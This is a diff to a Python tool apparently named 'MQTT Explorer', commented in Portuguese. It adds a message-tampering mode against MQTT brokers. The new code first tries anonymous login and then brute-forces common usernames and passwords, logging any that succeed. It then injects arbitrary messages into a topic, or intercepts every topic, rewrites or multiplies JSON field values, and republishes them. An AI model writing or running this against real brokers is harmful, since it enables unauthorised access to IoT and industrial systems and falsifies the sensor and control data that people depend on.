@@ -15,6 +15,7 @@ import random
 import string
 import logging
 import argparse
+import json
 import threading
 from datetime import datetime
 from queue import Queue
@@ -36,6 +37,8 @@ from config import (
 
 # Importar funções de relatório
 from report_generator import save_and_report_results
+# Importar modificador MQTT
+from mqtt_modifier import MQTTModifier
 
 # Configuração de logging
 logging.basicConfig(
@@ -402,6 +405,15 @@ def main():
     parser.add_argument("--port", type=int, default=1883, help="Porta MQTT (padrão: 1883)")
     parser.add_argument("--ssl", action="store_true", help="Usar SSL/TLS para conexão")
     parser.add_argument("--report", action="store_true", help="Gerar relatório HTML de vulnerabilidades")
+    
+    # Argumentos para modificação de mensagens
+    parser.add_argument("--modify", action="store_true", help="Entrar no modo de modificação de mensagens")
+    parser.add_argument("--topic", type=str, help="Tópico específico para interceptar ou publicar mensagens")
+    parser.add_argument("--inject", type=str, help="Mensagem a ser injetada em um tópico")
+    parser.add_argument("--field", type=str, help="Campo JSON a ser modificado em mensagens interceptadas")
+    parser.add_argument("--value", type=str, help="Novo valor para o campo modificado")
+    parser.add_argument("--multiply", type=float, help="Fator de multiplicação para valores numéricos")
+    parser.add_argument("--republish", action="store_true", default=True, help="Republicar mensagens modificadas")
     args = parser.parse_args()
     
     logger.info("Iniciando MQTT Explorer")
@@ -447,11 +459,95 @@ def main():
     for i, target in enumerate(targets, 1):
         logger.info(f"{i}. {target['host']}:{target['port']} (SSL: {target['use_ssl']})")
     
-    # Executar exploração
-    results = explore_mqtt_targets(targets)
+    # Verificar se é modo de modificação
+    if args.modify:
+        logger.info("Iniciando modo de modificação de mensagens MQTT")
+        
+        # Obter o primeiro alvo para modificação
+        if not targets:
+            logger.error("Nenhum alvo especificado para modificação. Use --url ou --host")
+            return
+        
+        target = targets[0]  # Usar apenas o primeiro alvo no modo de modificação
+        logger.info(f"Usando alvo: {target['host']}:{target['port']} (SSL: {target['use_ssl']})")
+        
+        # Criar modificador
+        modifier = MQTTModifier(
+            target["host"], 
+            target["port"], 
+            username="",  # Usar autenticação anônima inicialmente
+            password="", 
+            use_ssl=target["use_ssl"]
+        )
+        
+        # Tentar conectar
+        if not modifier.connect():
+            logger.error("Falha ao conectar para modificação. Tentando com credenciais...")
+            
+            # Testar credenciais comuns
+            connected = False
+            for username in COMMON_USERNAMES[:5]:  # Testar apenas os primeiros usernames
+                for password in COMMON_PASSWORDS[:5]:  # e senhas
+                    modifier = MQTTModifier(
+                        target["host"], 
+                        target["port"], 
+                        username=username,
+                        password=password, 
+                        use_ssl=target["use_ssl"]
+                    )
+                    if modifier.connect():
+                        logger.info(f"Conectado com credenciais: {username}:{password}")
+                        connected = True
+                        break
+                if connected:
+                    break
+            
+            if not connected:
+                logger.error("Não foi possível conectar ao broker para modificação")
+                return
+        
+        # Configurar função de modificação
+        modifier_func = None
+        
+        if args.field and args.value:  # Modificar um campo específico
+            from mqtt_modifier import json_field_modifier
+            modifier_func = json_field_modifier(args.field, args.value)
+            logger.info(f"Configurado para modificar o campo '{args.field}' para '{args.value}'")
+        elif args.field and args.multiply:  # Multiplicar um valor
+            from mqtt_modifier import json_value_multiplier
+            modifier_func = json_value_multiplier(args.field, args.multiply)
+            logger.info(f"Configurado para multiplicar o campo '{args.field}' por {args.multiply}")
+        
+        # Injetar uma mensagem específica ou iniciar interceptação
+        if args.topic and args.inject:
+            logger.info(f"Injetando mensagem no tópico {args.topic}")
+            modifier.publish_message(args.topic, args.inject)
+            logger.info("Mensagem injetada com sucesso. Encerrando.")
+            modifier.stop()
+            return
+        else:
+            # Iniciar interceptação
+            topics = [args.topic] if args.topic else ["#"]
+            logger.info(f"Iniciando interceptação nos tópicos: {', '.join(topics)}")
+            modifier.start_interception(topic_filters=topics, modifier_func=modifier_func, republish=args.republish)
+            
+            try:
+                # Manter o programa em execução
+                logger.info("Interceptação em andamento. Pressione Ctrl+C para encerrar...")
+                while True:
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                logger.info("Interceptação encerrada pelo usuário.")
+                modifier.stop()
+                return
     
-    # Exibir resumo
-    logger.info("Resumo da exploração:")
+    # Modo normal de exploração
+    else:
+        # Executar exploração
+        results = explore_mqtt_targets(targets)
+        
+        # Exibir resumo
+        logger.info("Resumo da exploração:")
     
     vulnerable_count = len(results["vulnerable_targets"])
     if vulnerable_count > 0:
